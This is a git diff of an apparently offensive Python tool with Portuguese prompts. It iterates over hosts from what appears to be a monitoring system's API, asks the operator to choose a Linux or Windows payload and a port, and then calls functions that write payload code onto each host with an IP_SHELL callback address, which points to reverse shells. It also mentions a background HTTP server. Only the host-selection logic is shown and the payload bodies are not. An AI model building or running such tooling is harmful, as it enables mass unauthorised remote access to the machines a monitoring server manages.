@@ -178,26 +178,50 @@ def write_code_in_host_win(auth_token, hostid, interfaceid,IP_SHELL):
     
 
 def main():
-    
     try:
         response_data = listar_interface_host(AUTH_TOKEN)
         if response_data and "result" in response_data:
             for host in response_data['result']:
                 hostid = host['hostid']
                 hostname = host['host']
-                interfaceid = host['interfaces'][0]['interfaceid']                
-                porta = int(input(f"Digite a porta para o host '{hostname}': "))
+                interfaceid = host['interfaces'][0]['interfaceid']
+                
+                while True:
+                    print(f"\nHost: {hostname}")
+                    print("Escolha o tipo de payload:")
+                    print("1 - Linux")
+                    print("2 - Windows")
+                    print("3 - Proxima")
+                    opcao = input("Digite sua escolha (1, 2 ou 3): ")
+
+                    if opcao in ["1", "2", "3"]:
+                        break
+                    else:
+                        print("Opção inválida. Por favor, escolha 1 para Linux, 2 para Windows ou 3 para próximo.")
+
+                if opcao == "3":
+                    print("Passando para o próximo host...")
+                    continue  # Pula para o próximo host
+                
+                try:
+                    porta = int(input(f"Digite a porta para o host '{hostname}': "))
+                except ValueError:
+                    print("Porta inválida! Por favor, insira um número inteiro.")
+                    continue
+
                 # Aguarda confirmação do usuário
                 input(f"Pressione ENTER para continuar com o host '{hostname}' na porta {porta}...")
 
                 # Configura payloads para sistemas Linux ou Windows
-                if any(word.lower() in hostname.lower() for word in PALAVRAS_CHAVE_LINUX):
+                if opcao == "1":
                     write_code_in_host_linux(AUTH_TOKEN, hostid, interfaceid, IP_SHELL, porta)
-                else:
+                elif opcao == "2":
                     payload_win(porta)
                     write_code_in_host_win(AUTH_TOKEN, hostid, interfaceid, IP_SHELL)
-    finally:
-        print("Servidor HTTP em background.")
+
+    except Exception as e:
+        print(f"Ocorreu um erro: {e}")
+
 
 if __name__ == "__main__":
     main()
